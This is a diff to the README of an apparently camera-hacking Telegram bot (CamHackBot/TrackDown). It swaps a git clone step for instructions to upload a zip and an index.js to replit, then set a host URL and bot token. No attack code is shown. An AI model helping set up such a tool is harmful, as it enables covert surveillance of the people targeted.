@@ -13,14 +13,15 @@
 ### All our Bots in this channel[@hexada_tech_info](https://t.me/hexada_tech_info)
 
 
-[![Run on Repl.it](https://repl.it/badge/github/Yadav210012/CamHackBot)](https://repl.it/github/Yadav210012/CamHackBot)
-
-
 ### How to build
 1. Create a telegram bot through [BotFather](https://t.me/BotFather).
 1. Copy it's API key
-1. Clone the repo using `git clone https://github.com/Yadav210012/CamHackBot`
+1. download this repo as `zip` and extract it to your files 
 1. `cd TrackDown`
+1. open [![https://replit.com](https://i.ibb.co/drSXSCM/bzyhgukomno6e79t4men.jpg)](https://replit.com)
+1. import this 2 files `script.zip` and `index.js`
+1. start the `index.js` by click to run 
+1. the files should be extracted now 
 1. edit hosturl url in `hosturl.txt` put your host url in the txt file and save .
 1. Edit `bottoken` and add your bot token and save. 
 1. Run `npm install`
